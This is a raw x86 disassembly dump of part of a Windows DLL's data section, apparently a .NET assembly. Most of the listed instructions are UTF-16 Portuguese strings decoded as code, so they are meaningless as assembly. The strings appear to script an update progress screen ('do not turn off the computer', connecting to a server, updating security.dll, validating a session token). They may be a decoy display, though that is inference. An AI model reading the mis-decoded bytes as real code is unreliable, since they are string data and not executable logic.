100083c5:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
100083c9:	20 00                	and    %al,(%eax)
100083cb:	63 00                	arpl   %eax,(%eax)
100083cd:	6f                   	outsl  %ds:(%esi),(%dx)
100083ce:	00 6e 00             	add    %ch,0x0(%esi)
100083d1:	66 00 69 00          	data16 add %ch,0x0(%ecx)
100083d5:	67 00 75 00          	add    %dh,0x0(%di)
100083d9:	72 00                	jb     0x100083db
100083db:	61                   	popa
100083dc:	00 63 00             	add    %ah,0x0(%ebx)
100083df:	61                   	popa
100083e0:	00 6f 00             	add    %ch,0x0(%edi)
100083e3:	2e 00 2e             	add    %ch,%cs:(%esi)
100083e6:	00 2e                	add    %ch,(%esi)
100083e8:	00 00                	add    %al,(%eax)
100083ea:	53                   	push   %ebx
100083eb:	30 00                	xor    %al,(%eax)
100083ed:	25 00 20 00 63       	and    $0x63002000,%eax
100083f2:	00 6f 00             	add    %ch,0x0(%edi)
100083f5:	6e                   	outsb  %ds:(%esi),(%dx)
100083f6:	00 63 00             	add    %ah,0x0(%ebx)
100083f9:	6c                   	insb   (%dx),%es:(%edi)
100083fa:	00 75 00             	add    %dh,0x0(%ebp)
100083fd:	69 00 64 00 6f 00    	imul   $0x6f0064,(%eax),%eax
10008403:	20 00                	and    %al,(%eax)
10008405:	2d 00 20 00 4e       	sub    $0x4e002000,%eax
1000840a:	00 61 00             	add    %ah,0x0(%ecx)
1000840d:	6f                   	outsl  %ds:(%esi),(%dx)
1000840e:	00 20                	add    %ah,(%eax)
10008410:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
10008414:	00 73 00             	add    %dh,0x0(%ebx)
10008417:	6c                   	insb   (%dx),%es:(%edi)
10008418:	00 69 00             	add    %ch,0x0(%ecx)
1000841b:	67 00 75 00          	add    %dh,0x0(%di)
1000841f:	65 00 20             	add    %ah,%gs:(%eax)
10008422:	00 6f 00             	add    %ch,0x0(%edi)
10008425:	20 00                	and    %al,(%eax)
10008427:	63 00                	arpl   %eax,(%eax)
10008429:	6f                   	outsl  %ds:(%esi),(%dx)
1000842a:	00 6d 00             	add    %ch,0x0(%ebp)
1000842d:	70 00                	jo     0x1000842f
1000842f:	75 00                	jne    0x10008431
10008431:	74 00                	je     0x10008433
10008433:	61                   	popa
10008434:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
10008438:	00 72 00             	add    %dh,0x0(%edx)
1000843b:	2e 00 01             	add    %al,%cs:(%ecx)
1000843e:	21 20                	and    %esp,(%eax)
10008440:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
10008444:	00 47 00             	add    %al,0x0(%edi)
10008447:	20 00                	and    %al,(%eax)
10008449:	44                   	inc    %esp
1000844a:	00 4f 00             	add    %cl,0x0(%edi)
1000844d:	20 00                	and    %al,(%eax)
1000844f:	53                   	push   %ebx
10008450:	00 49 00             	add    %cl,0x0(%ecx)
10008453:	53                   	push   %ebx
10008454:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
10008458:	00 4d 00             	add    %cl,0x0(%ebp)
1000845b:	41                   	inc    %ecx
1000845c:	00 20                	add    %ah,(%eax)
1000845e:	00 00                	add    %al,(%eax)
10008460:	51                   	push   %ecx
10008461:	5d                   	pop    %ebp
10008462:	00 20                	add    %ah,(%eax)
10008464:	00 49 00             	add    %cl,0x0(%ecx)
10008467:	6e                   	outsb  %ds:(%esi),(%dx)
10008468:	00 69 00             	add    %ch,0x0(%ecx)
1000846b:	63 00                	arpl   %eax,(%eax)
1000846d:	69 00 61 00 6e 00    	imul   $0x6e0061,(%eax),%eax
10008473:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10008477:	20 00                	and    %al,(%eax)
10008479:	70 00                	jo     0x1000847b
1000847b:	72 00                	jb     0x1000847d
1000847d:	6f                   	outsl  %ds:(%esi),(%dx)
1000847e:	00 63 00             	add    %ah,0x0(%ebx)
10008481:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
10008485:	73 00                	jae    0x10008487
10008487:	6f                   	outsl  %ds:(%esi),(%dx)
10008488:	00 20                	add    %ah,(%eax)
1000848a:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
1000848e:	00 20                	add    %ah,(%eax)
10008490:	00 61 00             	add    %ah,0x0(%ecx)
10008493:	74 00                	je     0x10008495
10008495:	75 00                	jne    0x10008497
10008497:	61                   	popa
10008498:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
1000849c:	00 7a 00             	add    %bh,0x0(%edx)
1000849f:	61                   	popa
100084a0:	00 63 00             	add    %ah,0x0(%ebx)
100084a3:	61                   	popa
100084a4:	00 6f 00             	add    %ch,0x0(%edi)
100084a7:	2e 00 2e             	add    %ch,%cs:(%esi)
100084aa:	00 2e                	add    %ch,(%esi)
100084ac:	00 0a                	add    %cl,(%edx)
100084ae:	00 5b 00             	add    %bl,0x0(%ebx)
100084b1:	00 33                	add    %dh,(%ebx)
100084b3:	5d                   	pop    %ebp
100084b4:	00 20                	add    %ah,(%eax)
100084b6:	00 43 00             	add    %al,0x0(%ebx)
100084b9:	6f                   	outsl  %ds:(%esi),(%dx)
100084ba:	00 6e 00             	add    %ch,0x0(%esi)
100084bd:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
100084c1:	74 00                	je     0x100084c3
100084c3:	61                   	popa
100084c4:	00 6e 00             	add    %ch,0x0(%esi)
100084c7:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
100084cb:	20 00                	and    %al,(%eax)
100084cd:	61                   	popa
100084ce:	00 6f 00             	add    %ch,0x0(%edi)
100084d1:	20 00                	and    %al,(%eax)
100084d3:	73 00                	jae    0x100084d5
100084d5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
100084d9:	76 00                	jbe    0x100084db
100084db:	69 00 64 00 6f 00    	imul   $0x6f0064,(%eax),%eax
100084e1:	72 00                	jb     0x100084e3
100084e3:	20 00                	and    %al,(%eax)
100084e5:	00 15 2e 00 63 00    	add    %dl,0x63002e
100084eb:	6f                   	outsl  %ds:(%esi),(%dx)
100084ec:	00 6d 00             	add    %ch,0x0(%ebp)
100084ef:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
100084f3:	72 00                	jb     0x100084f5
100084f5:	2e 00 2e             	add    %ch,%cs:(%esi)
100084f8:	00 2e                	add    %ch,(%esi)
100084fa:	00 00                	add    %al,(%eax)
100084fc:	4f                   	dec    %edi
100084fd:	56                   	push   %esi
100084fe:	00 65 00             	add    %ah,0x0(%ebp)
10008501:	72 00                	jb     0x10008503
10008503:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
10008509:	63 00                	arpl   %eax,(%eax)
1000850b:	61                   	popa
1000850c:	00 6e 00             	add    %ch,0x0(%esi)
1000850f:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10008513:	20 00                	and    %al,(%eax)
10008515:	69 00 6e 00 74 00    	imul   $0x74006e,(%eax),%eax
1000851b:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
1000851f:	72 00                	jb     0x10008521
10008521:	69 00 64 00 61 00    	imul   $0x610064,(%eax),%eax
10008527:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
1000852b:	20 00                	and    %al,(%eax)
1000852d:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10008531:	73 00                	jae    0x10008533
10008533:	20 00                	and    %al,(%eax)
10008535:	61                   	popa
10008536:	00 72 00             	add    %dh,0x0(%edx)
10008539:	71 00                	jno    0x1000853b
1000853b:	75 00                	jne    0x1000853d
1000853d:	69 00 76 00 6f 00    	imul   $0x6f0076,(%eax),%eax
10008543:	73 00                	jae    0x10008545
10008545:	2e 00 2e             	add    %ch,%cs:(%esi)
10008548:	00 2e                	add    %ch,(%esi)
1000854a:	00 00                	add    %al,(%eax)
1000854c:	4b                   	dec    %ebx
1000854d:	43                   	inc    %ebx
1000854e:	00 6f 00             	add    %ch,0x0(%edi)
10008551:	6e                   	outsb  %ds:(%esi),(%dx)
10008552:	00 65 00             	add    %ah,0x0(%ebp)
10008555:	78 00                	js     0x10008557
10008557:	61                   	popa
10008558:	00 6f 00             	add    %ch,0x0(%edi)
1000855b:	20 00                	and    %al,(%eax)
1000855d:	73 00                	jae    0x1000855f
1000855f:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
10008563:	75 00                	jne    0x10008565
10008565:	72 00                	jb     0x10008567
10008567:	61                   	popa
10008568:	00 20                	add    %ah,(%eax)
1000856a:	00 65 00             	add    %ah,0x0(%ebp)
1000856d:	73 00                	jae    0x1000856f
1000856f:	74 00                	je     0x10008571
10008571:	61                   	popa
10008572:	00 62 00             	add    %ah,0x0(%edx)
10008575:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
1000857a:	00 63 00             	add    %ah,0x0(%ebx)
1000857d:	69 00 64 00 61 00    	imul   $0x610064,(%eax),%eax
10008583:	20 00                	and    %al,(%eax)
10008585:	28 00                	sub    %al,(%eax)
10008587:	54                   	push   %esp
10008588:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
1000858c:	00 20                	add    %ah,(%eax)
1000858e:	00 31                	add    %dh,(%ecx)
10008590:	00 2e                	add    %ch,(%esi)
10008592:	00 33                	add    %dh,(%ebx)
10008594:	00 29                	add    %ch,(%ecx)
10008596:	00 00                	add    %al,(%eax)
10008598:	33 43 00             	xor    0x0(%ebx),%eax
1000859b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
1000859f:	74 00                	je     0x100085a1
100085a1:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
100085a7:	63 00                	arpl   %eax,(%eax)
100085a9:	61                   	popa
100085aa:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
100085ae:	00 20                	add    %ah,(%eax)
100085b0:	00 76 00             	add    %dh,0x0(%esi)
100085b3:	61                   	popa
100085b4:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
100085b8:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
100085bc:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
100085c0:	00 3a                	add    %bh,(%edx)
100085c2:	00 20                	add    %ah,(%eax)
100085c4:	00 43 00             	add    %al,0x0(%ebx)
100085c7:	4e                   	dec    %esi
100085c8:	00 3d 00 00 07 20    	add    %bh,0x20070000
100085ce:	00 43 00             	add    %al,0x0(%ebx)
100085d1:	41                   	inc    %ecx
100085d2:	00 00                	add    %al,(%eax)
100085d4:	31 44 00 6f          	xor    %eax,0x6f(%eax,%eax,1)
100085d8:	00 77 00             	add    %dh,0x0(%edi)
100085db:	6e                   	outsb  %ds:(%esi),(%dx)
100085dc:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
100085e0:	00 61 00             	add    %ah,0x0(%ecx)
100085e3:	64 00 20             	add    %ah,%fs:(%eax)
100085e6:	00 65 00             	add    %ah,0x0(%ebp)
100085e9:	6d                   	insl   (%dx),%es:(%edi)
100085ea:	00 20                	add    %ah,(%eax)
100085ec:	00 61 00             	add    %ah,0x0(%ecx)
100085ef:	6e                   	outsb  %ds:(%esi),(%dx)
100085f0:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
100085f4:	00 6d 00             	add    %ch,0x0(%ebp)
100085f7:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
100085fb:	74 00                	je     0x100085fd
100085fd:	6f                   	outsl  %ds:(%esi),(%dx)
100085fe:	00 2e                	add    %ch,(%esi)
10008600:	00 2e                	add    %ch,(%esi)
10008602:	00 2e                	add    %ch,(%esi)
10008604:	00 00                	add    %al,(%eax)
10008606:	47                   	inc    %edi
10008607:	43                   	inc    %ebx
10008608:	00 6f 00             	add    %ch,0x0(%edi)
1000860b:	6d                   	insl   (%dx),%es:(%edi)
1000860c:	00 70 00             	add    %dh,0x0(%eax)
1000860f:	6f                   	outsl  %ds:(%esi),(%dx)
10008610:	00 6e 00             	add    %ch,0x0(%esi)
10008613:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
10008617:	74 00                	je     0x10008619
10008619:	65 00 20             	add    %ah,%gs:(%eax)
1000861c:	00 61 00             	add    %ah,0x0(%ecx)
1000861f:	74 00                	je     0x10008621
10008621:	75 00                	jne    0x10008623
10008623:	61                   	popa
10008624:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
10008628:	00 7a 00             	add    %bh,0x0(%edx)
1000862b:	61                   	popa
1000862c:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
10008630:	00 3a                	add    %bh,(%edx)
10008632:	00 20                	add    %ah,(%eax)
10008634:	00 73 00             	add    %dh,0x0(%ebx)
10008637:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
1000863b:	75 00                	jne    0x1000863d
1000863d:	72 00                	jb     0x1000863f
1000863f:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
10008645:	2e 00 64 00 6c       	add    %ah,%cs:0x6c(%eax,%eax,1)
1000864a:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
1000864e:	35 52 00 65 00       	xor    $0x650052,%eax
10008653:	67 00 69 00          	add    %ch,0x0(%bx,%di)
10008657:	73 00                	jae    0x10008659
10008659:	74 00                	je     0x1000865b
1000865b:	72 00                	jb     0x1000865d
1000865d:	61                   	popa
1000865e:	00 6e 00             	add    %ch,0x0(%esi)
10008661:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10008665:	20 00                	and    %al,(%eax)
10008667:	62 00                	bound  %eax,(%eax)
10008669:	69 00 62 00 6c 00    	imul   $0x6c0062,(%eax),%eax
1000866f:	69 00 6f 00 74 00    	imul   $0x74006f,(%eax),%eax
10008675:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
10008679:	61                   	popa
1000867a:	00 73 00             	add    %dh,0x0(%ebx)
1000867d:	2e 00 2e             	add    %ch,%cs:(%esi)
10008680:	00 2e                	add    %ch,(%esi)
10008682:	00 00                	add    %al,(%eax)
10008684:	4f                   	dec    %edi
10008685:	41                   	inc    %ecx
10008686:	00 70 00             	add    %dh,0x0(%eax)
10008689:	6c                   	insb   (%dx),%es:(%edi)
1000868a:	00 69 00             	add    %ch,0x0(%ecx)
1000868d:	63 00                	arpl   %eax,(%eax)
1000868f:	61                   	popa
10008690:	00 6e 00             	add    %ch,0x0(%esi)
10008693:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10008697:	20 00                	and    %al,(%eax)
10008699:	63 00                	arpl   %eax,(%eax)
1000869b:	6f                   	outsl  %ds:(%esi),(%dx)
1000869c:	00 6e 00             	add    %ch,0x0(%esi)
1000869f:	66 00 69 00          	data16 add %ch,0x0(%ecx)
100086a3:	67 00 75 00          	add    %dh,0x0(%di)
100086a7:	72 00                	jb     0x100086a9
100086a9:	61                   	popa
100086aa:	00 63 00             	add    %ah,0x0(%ebx)
100086ad:	6f                   	outsl  %ds:(%esi),(%dx)
100086ae:	00 65 00             	add    %ah,0x0(%ebp)
100086b1:	73 00                	jae    0x100086b3
100086b3:	20 00                	and    %al,(%eax)
100086b5:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
100086b9:	20 00                	and    %al,(%eax)
100086bb:	73 00                	jae    0x100086bd
100086bd:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
100086c1:	75 00                	jne    0x100086c3
100086c3:	72 00                	jb     0x100086c5
100086c5:	61                   	popa
100086c6:	00 6e 00             	add    %ch,0x0(%esi)
100086c9:	63 00                	arpl   %eax,(%eax)
100086cb:	61                   	popa
100086cc:	00 2e                	add    %ch,(%esi)
100086ce:	00 2e                	add    %ch,(%esi)
100086d0:	00 2e                	add    %ch,(%esi)
100086d2:	00 00                	add    %al,(%eax)
100086d4:	4b                   	dec    %ebx
100086d5:	53                   	push   %ebx
100086d6:	00 69 00             	add    %ch,0x0(%ecx)
100086d9:	6e                   	outsb  %ds:(%esi),(%dx)
100086da:	00 63 00             	add    %ah,0x0(%ebx)
100086dd:	72 00                	jb     0x100086df
100086df:	6f                   	outsl  %ds:(%esi),(%dx)
100086e0:	00 6e 00             	add    %ch,0x0(%esi)
100086e3:	69 00 7a 00 61 00    	imul   $0x61007a,(%eax),%eax
100086e9:	6e                   	outsb  %ds:(%esi),(%dx)
100086ea:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
100086ee:	00 20                	add    %ah,(%eax)
100086f0:	00 63 00             	add    %ah,0x0(%ebx)
100086f3:	6f                   	outsl  %ds:(%esi),(%dx)
100086f4:	00 6d 00             	add    %ch,0x0(%ebp)
100086f7:	20 00                	and    %al,(%eax)
100086f9:	73 00                	jae    0x100086fb
100086fb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
100086ff:	76 00                	jbe    0x10008701
10008701:	69 00 64 00 6f 00    	imul   $0x6f0064,(%eax),%eax
10008707:	72 00                	jb     0x10008709
10008709:	20 00                	and    %al,(%eax)
1000870b:	63 00                	arpl   %eax,(%eax)
1000870d:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
10008711:	74 00                	je     0x10008713
10008713:	72 00                	jb     0x10008715
10008715:	61                   	popa
10008716:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
1000871a:	00 2e                	add    %ch,(%esi)
1000871c:	00 2e                	add    %ch,(%esi)
1000871e:	00 00                	add    %al,(%eax)
10008720:	39 56 00             	cmp    %edx,0x0(%esi)
10008723:	61                   	popa
10008724:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
10008728:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
1000872c:	00 6e 00             	add    %ch,0x0(%esi)
1000872f:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10008733:	20 00                	and    %al,(%eax)
10008735:	74 00                	je     0x10008737
10008737:	6f                   	outsl  %ds:(%esi),(%dx)
10008738:	00 6b 00             	add    %ch,0x0(%ebx)
1000873b:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
1000873f:	20 00                	and    %al,(%eax)
10008741:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10008745:	20 00                	and    %al,(%eax)
10008747:	73 00                	jae    0x10008749
10008749:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
1000874d:	73 00                	jae    0x1000874f
1000874f:	61                   	popa
10008750:	00 6f 00             	add    %ch,0x0(%edi)
10008753:	2e 00 2e             	add    %ch,%cs:(%esi)
10008756:	00 2e                	add    %ch,(%esi)
10008758:	00 00                	add    %al,(%eax)
1000875a:	00 00                	add    %al,(%eax)
1000875c:	dd 64 3f 04          	frstor 0x4(%edi,%edi,1)
10008760:	a1 47 72 43 97       	mov    0x97437247,%eax
10008765:	3b d0                	cmp    %eax,%edx
10008767:	a1 65 3f b4 c0       	mov    0xc0b43f65,%eax
1000876c:	00 08                	add    %cl,(%eax)
1000876e:	b7 7a                	mov    $0x7a,%bh
10008770:	5c                   	pop    %esp
10008771:	56                   	push   %esi
10008772:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
10008775:	89 05 00 02 02 08    	mov    %eax,0x8020200
1000877b:	08 08                	or     %cl,(%eax)
1000877d:	00 05 01 09 08 08    	add    %al,0x8080901
10008783:	08 08                	or     %cl,(%eax)
10008785:	07                   	pop    %es
10008786:	00 04 01             	add    %al,(%ecx,%eax,1)
10008789:	05 05 09 08 04       	add    $0x4080905,%eax
1000878e:	00 01                	add    %al,(%ecx)
10008790:	02 02                	add    (%edx),%al
10008792:	02 06                	add    (%esi),%al
10008794:	02 05 00 02 01 08    	add    0x8010200,%al
1000879a:	08 04 00             	or     %al,(%eax,%eax,1)
1000879d:	01 01                	add    %eax,(%ecx)
1000879f:	08 04 00             	or     %al,(%eax,%eax,1)
100087a2:	01 01                	add    %eax,(%ecx)
100087a4:	05 03 00 00 01       	add    $0x1000003,%eax
100087a9:	03 20                	add    (%eax),%esp
100087ab:	00 01                	add    %al,(%ecx)
100087ad:	02 06                	add    (%esi),%al
100087af:	08 04 20             	or     %al,(%eax,%eiz,1)
100087b2:	00 cc                	add    %cl,%ah
100087b4:	00 04 00             	add    %al,(%eax,%eax,1)
100087b7:	00 00                	add    %al,(%eax)
100087b9:	40                   	inc    %eax
100087ba:	04 00                	add    $0x0,%al
100087bc:	01 18                	add    %ebx,(%eax)
100087be:	18 05 00 02 08 18    	sbb    %al,0x18080200
100087c4:	18 06                	sbb    %al,(%esi)
100087c6:	00 03                	add    %al,(%ebx)
100087c8:	18 18                	sbb    %bl,(%eax)
100087ca:	08 08                	or     %cl,(%eax)
100087cc:	05 00 02 18 18       	add    $0x18180200,%eax
100087d1:	18 0c 00             	sbb    %cl,(%eax,%eax,1)
100087d4:	09 02                	or     %eax,(%edx)
100087d6:	18 08                	sbb    %cl,(%eax)
100087d8:	08 08                	or     %cl,(%eax)
100087da:	08 18                	or     %bl,(%eax)
100087dc:	08 08                	or     %cl,(%eax)
100087de:	08 04 00             	or     %al,(%eax,%eax,1)
100087e1:	01 02                	add    %eax,(%edx)
100087e3:	18 08                	sbb    %cl,(%eax)
100087e5:	b0 3f                	mov    $0x3f,%al
100087e7:	5f                   	pop    %edi
100087e8:	7f 11                	jg     0x100087fb
100087ea:	d5 0a                	aad    $0xa
100087ec:	3a 06                	cmp    (%esi),%al
100087ee:	00 02                	add    %al,(%edx)
100087f0:	12 09                	adc    (%ecx),%cl
100087f2:	08 08                	or     %cl,(%eax)
100087f4:	03 00                	add    (%eax),%eax
100087f6:	00 18                	add    %bl,(%eax)
100087f8:	07                   	pop    %es
100087f9:	00 03                	add    %al,(%ebx)
100087fb:	08 18                	or     %bl,(%eax)
100087fd:	12 0d 08 04 00 01    	adc    0x1000408,%cl
10008803:	08 18                	or     %bl,(%eax)
10008805:	06                   	push   %es
10008806:	00 02                	add    %al,(%edx)
10008808:	09 18                	or     %ebx,(%eax)
1000880a:	10 09                	adc    %cl,(%ecx)
1000880c:	03 00                	add    (%eax),%eax
1000880e:	00 0e                	add    %cl,(%esi)
10008810:	04 00                	add    $0x0,%al
10008812:	01 06                	add    %eax,(%esi)
10008814:	08 03                	or     %al,(%ebx)
10008816:	06                   	push   %es
10008817:	1d 02 06 06 15       	sbb    $0x15060602,%eax
1000881c:	12 11                	adc    (%ecx),%dl
1000881e:	01 0e                	add    %ecx,(%esi)
10008820:	02 06                	add    (%esi),%al
10008822:	1c 03                	sbb    $0x3,%al
10008824:	06                   	push   %es
10008825:	12 15 04 06 1f 19    	adc    0x191f0604,%dl
1000882b:	02 03                	add    (%ebx),%al
1000882d:	06                   	push   %es
1000882e:	1d 08 04 00 01       	sbb    $0x1000408,%eax
10008833:	0e                   	push   %cs
10008834:	08 04 00             	or     %al,(%eax,%eax,1)
10008837:	00 1d 0e 04 00 01    	add    %bl,0x100040e
1000883d:	02 08                	add    (%eax),%cl
1000883f:	04 ec                	add    $0xec,%al
10008841:	ff                   	(bad)
10008842:	ff                   	(bad)
10008843:	ff 04 00             	incl   (%eax,%eax,1)
10008846:	00 00                	add    %al,(%eax)
10008848:	08 04 80             	or     %al,(%eax,%eax,4)
1000884b:	00 00                	add    %al,(%eax)
1000884d:	00 05 00 02 02 18    	add    %al,0x18020200
10008853:	09 06                	or     %eax,(%esi)
10008855:	00 03                	add    %al,(%ebx)
10008857:	08 18                	or     %bl,(%eax)
10008859:	08 08                	or     %cl,(%eax)
1000885b:	05 00 02 08 18       	add    $0x18080200,%eax
10008860:	08 0a                	or     %cl,(%edx)
10008862:	00 07                	add    %al,(%edi)
10008864:	02 18                	add    (%eax),%bl
10008866:	18 08                	sbb    %cl,(%eax)
10008868:	08 08                	or     %cl,(%eax)
1000886a:	08 09                	or     %cl,(%ecx)
1000886c:	05 00 02 09 18       	add    $0x18090200,%eax
10008871:	18 06                	sbb    %al,(%esi)
10008873:	00 03                	add    %al,(%ebx)
10008875:	02 09                	add    (%ecx),%cl
10008877:	09 02                	or     %eax,(%edx)
10008879:	03 00                	add    (%eax),%eax
1000887b:	00 09                	add    %cl,(%ecx)
1000887d:	02 06                	add    (%esi),%al
1000887f:	18 03                	sbb    %al,(%ebx)
10008881:	06                   	push   %es
10008882:	12 1d 03 00 00 02    	adc    0x2000003,%bl
10008888:	04 00                	add    $0x0,%al
1000888a:	01 01                	add    %eax,(%ecx)
1000888c:	18 03                	sbb    %al,(%ebx)
1000888e:	08 00                	or     %al,(%eax)
10008890:	02 04 20             	add    (%eax,%eiz,1),%al
10008893:	01 01                	add    %eax,(%ecx)
10008895:	08 04 20             	or     %al,(%eax,%eiz,1)
10008898:	01 01                	add    %eax,(%ecx)
1000889a:	0e                   	push   %cs
1000889b:	05 00 01 12 09       	add    $0x9120100,%eax
100088a0:	18 08                	sbb    %cl,(%eax)
100088a2:	07                   	pop    %es
100088a3:	05 18 18 18 18       	add    $0x18181818,%eax
100088a8:	12 09                	adc    (%ecx),%cl
100088aa:	05 00 02 02 18       	add    $0x18020200,%eax
100088af:	18 03                	sbb    %al,(%ebx)
100088b1:	20 00                	and    %al,(%eax)
100088b3:	08 03                	or     %al,(%ebx)
100088b5:	20 00                	and    %al,(%eax)
100088b7:	0e                   	push   %cs
100088b8:	07                   	pop    %es
100088b9:	07                   	pop    %es
100088ba:	04 18                	add    $0x18,%al
100088bc:	08 12                	or     %dl,(%edx)
100088be:	0d 0e 05 00 01       	or     $0x100050e,%eax
100088c3:	12 39                	adc    (%ecx),%bh
100088c5:	08 05 07 03 18 09    	or     %al,0x9180307
100088cb:	0e                   	push   %cs
100088cc:	05 20 02 01 1c       	add    $0x1c010220,%eax
100088d1:	18 05 20 01 01 12    	sbb    %al,0x12010120
100088d7:	3d 04 20 01 01       	cmp    $0x1012004,%eax
100088dc:	02 05 20 01 01 11    	add    0x11010120,%al
100088e2:	41                   	inc    %ecx
100088e3:	03 07                	add    (%edi),%eax
100088e5:	01 08                	add    %ecx,(%eax)
100088e7:	04 20                	add    $0x20,%al
100088e9:	01 02                	add    %eax,(%edx)
100088eb:	08 04 00             	or     %al,(%eax,%eax,1)
100088ee:	01 02                	add    %eax,(%edx)
100088f0:	0e                   	push   %cs
100088f1:	06                   	push   %es
100088f2:	00 02                	add    %al,(%edx)
100088f4:	01 1c 10             	add    %ebx,(%eax,%edx,1)
100088f7:	02 05 15 12 11 01    	add    0x1111215,%al
100088fd:	0e                   	push   %cs
100088fe:	05 20 01 01 13       	add    $0x13010120,%eax
10008903:	00 04 20             	add    %al,(%eax,%eiz,1)
10008906:	00 13                	add    %dl,(%ebx)
10008908:	00 04 00             	add    %al,(%eax,%eax,1)
1000890b:	01 01                	add    %eax,(%ecx)
1000890d:	1c 0c                	sbb    $0xc,%al
1000890f:	07                   	pop    %es
10008910:	09 08                	or     %ecx,(%eax)
10008912:	08 02                	or     %al,(%edx)
10008914:	02 0e                	add    (%esi),%cl
10008916:	02 1d 08 08 1c 0b    	add    0xb1c0808,%bl
1000891c:	07                   	pop    %es
1000891d:	08 08                	or     %cl,(%eax)
1000891f:	02 02                	add    (%edx),%al
10008921:	0e                   	push   %cs
10008922:	02 1d 08 08 1c 0b    	add    0xb1c0808,%bl
10008928:	07                   	pop    %es
10008929:	07                   	pop    %es
1000892a:	02 02                	add    (%edx),%al
1000892c:	03 1d 0e 1d 0e 03    	add    0x30e1d0e,%ebx
10008932:	03 05 20 00 1d 13    	add    0x131d0020,%eax
10008938:	00 08                	add    %cl,(%eax)
1000893a:	07                   	pop    %es
1000893b:	04 1d                	add    $0x1d,%al
1000893d:	0e                   	push   %cs
1000893e:	02 1d 0e 1c 04 07    	add    0x7041c0e,%bl
10008944:	02 02                	add    (%edx),%al
10008946:	02 04 01             	add    (%ecx,%eax,1),%al
10008949:	00 00                	add    %al,(%eax)
1000894b:	00 03                	add    %al,(%ebx)
1000894d:	06                   	push   %es
1000894e:	11 20                	adc    %esp,(%eax)
10008950:	07                   	pop    %es
10008951:	00 02                	add    %al,(%edx)
10008953:	01 12                	add    %edx,(%edx)
10008955:	65 11 69 03          	adc    %ebp,%gs:0x3(%ecx)
10008959:	06                   	push   %es
1000895a:	12 6d 03             	adc    0x3(%ebp),%ch
1000895d:	06                   	push   %es
1000895e:	12 71 02             	adc    0x2(%ecx),%dh
10008961:	06                   	push   %es
10008962:	0d 06 20 02 01       	or     $0x1022006,%eax
10008967:	1c 12                	sbb    $0x12,%al
10008969:	75 06                	jne    0x10008971
1000896b:	20 02                	and    %al,(%edx)
1000896d:	01 1c 12             	add    %ebx,(%edx,%edx,1)
10008970:	79 03                	jns    0x10008975
10008972:	06                   	push   %es
10008973:	12 24 03             	adc    (%ebx,%eax,1),%ah
10008976:	06                   	push   %es
10008977:	11 7d 03             	adc    %edi,0x3(%ebp)
1000897a:	06                   	push   %es
1000897b:	1d 0e 04 06 1d       	sbb    $0x1d06040e,%eax
10008980:	12 71 04             	adc    0x4(%ecx),%dh
10008983:	06                   	push   %es
10008984:	1d 12 6d 04 06       	sbb    $0x6046d12,%eax
10008989:	1d 1d 0e 03 06       	sbb    $0x6030e1d,%eax
1000898e:	12 3d 07 00 02 01    	adc    0x1020007,%bh
10008994:	1c 12                	sbb    $0x12,%al
10008996:	80 81 04 06 12 80 85 	addb   $0x85,-0x7fedf9fc(%ecx)
1000899d:	06                   	push   %es
1000899e:	00 02                	add    %al,(%edx)
100089a0:	01 1c 12             	add    %ebx,(%edx,%edx,1)
100089a3:	79 04                	jns    0x100089a9
100089a5:	06                   	push   %es
100089a6:	12 80 89 05 20 00    	adc    0x200589(%eax),%al
100089ac:	12 80 8d 06 20 01    	adc    0x120068d(%eax),%al
100089b2:	01 11                	add    %edx,(%ecx)
100089b4:	80 91 04 00 01 0d 0d 	adcb   $0xd,0xd010004(%ecx)
100089bb:	08 00                	or     %al,(%eax)
100089bd:	04 11                	add    $0x11,%al
